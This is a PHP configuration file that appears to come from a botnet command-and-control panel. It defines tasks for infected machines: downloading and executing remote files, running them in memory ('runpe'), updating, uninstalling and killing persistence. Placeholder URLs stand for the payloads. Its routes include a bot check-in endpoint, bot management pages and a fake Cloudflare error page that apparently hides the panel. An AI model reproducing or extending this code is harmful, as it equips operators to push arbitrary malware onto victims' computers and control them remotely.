<?php


$foundPlugins = array();

$task_configuration = array(
    "dande" => array(
        "name" => "download & execute",
        "command" => "dande",
        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
    ),
    "runpe" => array(
        "name" => "download & execute in memory",
        "command" => "runpe",
        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
    ),
    "update" => array(
        "name" => "update",
        "command" => "update",
        "placeholder" => "http://yourdomainorip.com/path/to/file.exe",
    ),
    "uninstall" => array(
        "name" => "uninstall",
        "command" => "uninstall",
    ),
    "killpersistence" => array(
        "name" => "kill persistence loader",
        "command" => "killpersistence",
    )
);

$defaulRoutes = array(
    "FakeErrors@cloudflare_offlinehost" => "/",

    "Main@login" => "/login" ,
    "Main@index" => "/dashboard",
    "Main@tasks" => array("/tasks","/tasks/(\d+)"),
    "Main@logout" => "/logout",
    "Main@settings" => "/settings" ,
    "Main@bots" => "/bots",

    "Main@taskdetails" => "/taskdetails/(\d+)",
    "Main@edituser" => "/edituser/(\d+)",
    "Main@botinfo" => "/botinfo/(\d+)",

    "BotHandler@request" =>"/request",
);